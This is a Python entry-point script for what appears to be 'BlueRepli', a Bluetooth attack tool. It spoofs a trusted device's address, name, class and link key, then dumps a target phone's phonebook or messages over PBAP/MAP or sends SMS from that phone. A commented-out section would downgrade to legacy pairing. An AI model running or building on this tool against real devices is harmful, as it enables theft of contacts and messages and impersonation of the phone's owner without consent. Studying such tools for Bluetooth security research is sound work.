#!/usr/bin/env python3

import os
import sys

from bluetooth import _bluetooth

from bluerepli.ui import parse_cmdline
from bluerepli.ui import INFO
from bluerepli.ui import WARNING
from bluerepli.ui import ERROR

from bluerepli.pce_repli import PCERepli
from bluerepli.pse_repli import PSERepli
from bluerepli.mce_repli import MCERepli

from bluerepli.hci import hci_write_authentication_enable
from bluerepli.hci import hci_write_simple_pairing_mode

from bluerepli.spoof import spoof_all


def main():
    args = parse_cmdline()
    try:
        spoof_all(
            iface=args['-i'], camo_addr=args['-a'], camo_name=args['-n'], 
            camo_cod=args['-c'], link_key=args['--link-key'], rname=args['--rname'], 
            raddr=args['TARGET']
        )
    except _bluetooth.error as e:
        if str(e) == "(9, 'Bad file descriptor')":
            print("[\x1B[1;31mERROR\x1B[0m] No Bluetooth adapter?")
            sys.exit(1)

    # Disable SSP, using Legacy Pairing
    #hci_write_simple_pairing_mode()
    #hci_write_authentication_enable(0x00)

    # os.system(
    #     "bt-agent -c NoInputNoOutput -p pin -d"
    # )

    if args['--dump-pb']:
        pce = PCERepli(raddr=args['TARGET'], iface=args['-i'])
        #print(pce.pull_vcard_listing(parse=False))
        pce.dump_pb(args['-d'])
    elif args['--dump-msg']:
        mce = MCERepli(raddr=args['TARGET'], iface=args['-i'])
        mce.dump_msg(args['-d'])
    elif args['--send-msg']:
        mce = MCERepli(raddr=args['TARGET'], iface=args['-i'])
        #mce.send_msg('I am BlueRepli.', '13291419798')
        mce.send_msg(args['MESSAGE'], args['PHONE'])
    else:
        print(ERROR, "Don't know what to do")
    # elif args['-m'] == 'pse':
    #     pser = PSERepli(args['-a'], args['-n'], 
    #         args['-c'], args['--raddr'], args['--rname'], 
    #         args['--rclass'], args['--link-key'], 
    #         args['-d'], args['-i']
    #     )
    #     pser.pene()
    # elif args['-m'] == 'maps':
    #     print(WARNING, args[-m], 'has not implemented yet')
    # elif args['-m'] == 'sapc':
    #     print(WARNING, args[-m], 'has not implemented yet')
    # elif args['-m'] == 'saps':
    #     print(WARNING, args[-m], 'has not implemented yet')
    # else:
    #     print(ERROR, 'Invalid mode', args['-m'])


def test():
    pass


if __name__ == '__main__':
    main()
